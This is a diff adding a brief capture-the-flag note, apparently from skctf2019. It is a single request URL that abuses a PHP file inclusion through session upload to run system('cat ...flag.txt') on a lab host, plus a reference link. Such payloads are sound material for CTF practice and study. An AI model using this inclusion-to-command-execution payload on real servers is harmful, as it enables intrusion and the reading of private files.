@@ -1,0 +1,4 @@
+http://192.168.211.171:8009/test.php?file=/tmp/daolgts&daolgts=system(%27cat%20/skctf2019/flag.txt%27);
+
+session_upload
+https://www.anquanke.com/post/id/177491#h2-14
